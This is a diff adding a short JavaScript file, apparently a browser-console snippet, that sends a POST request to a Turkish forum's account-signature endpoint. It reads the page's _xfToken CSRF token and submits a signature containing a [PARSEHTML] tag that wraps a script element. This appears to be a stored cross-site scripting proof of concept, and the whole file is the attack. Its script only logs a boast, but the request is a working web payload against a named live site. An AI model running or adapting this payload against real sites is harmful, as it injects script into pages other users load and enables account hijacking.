@@ -1,0 +1,20 @@
+fetch("https://crackturkey.com/account/signature", {
+  "headers": {
+    "accept": "application/json, text/javascript, */*; q=0.01",
+    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryoKaHR9HJdWOPL6lF",
+    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Windows\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  "referrer": "https://crackturkey.com/account/signature",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": '------WebKitFormBoundaryoKaHR9HJdWOPL6lF\r\nContent-Disposition: form-data; name=\"signature_html\"\r\n\r\n<p>[PARSEHTML]&lt;script&gt;console.log(\"cvcv on top\")&lt;/script&gt;[/PARSEHTML]</p>\r\n------WebKitFormBoundaryoKaHR9HJdWOPL6lF\r\nContent-Disposition: form-data; name=\"_xfToken\"\r\n\r\n'+document.querySelector("[name=_xfToken]").value+'\r\n------WebKitFormBoundaryoKaHR9HJdWOPL6lF\r\nContent-Disposition: form-data; name=\"_xfRequestUri\"\r\n\r\n/account/signature\r\n------WebKitFormBoundaryoKaHR9HJdWOPL6lF\r\nContent-Disposition: form-data; name=\"_xfWithData\"\r\n\r\n1\r\n------WebKitFormBoundaryoKaHR9HJdWOPL6lF\r\nContent-Disposition: form-data; name=\"_xfToken\"\r\n\r\n'+document.querySelector("[name=_xfToken]").value+'\r\n------WebKitFormBoundaryoKaHR9HJdWOPL6lF\r\nContent-Disposition: form-data; name=\"_xfResponseType\"\r\n\r\njson\r\n------WebKitFormBoundaryoKaHR9HJdWOPL6lF--\r\n',
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
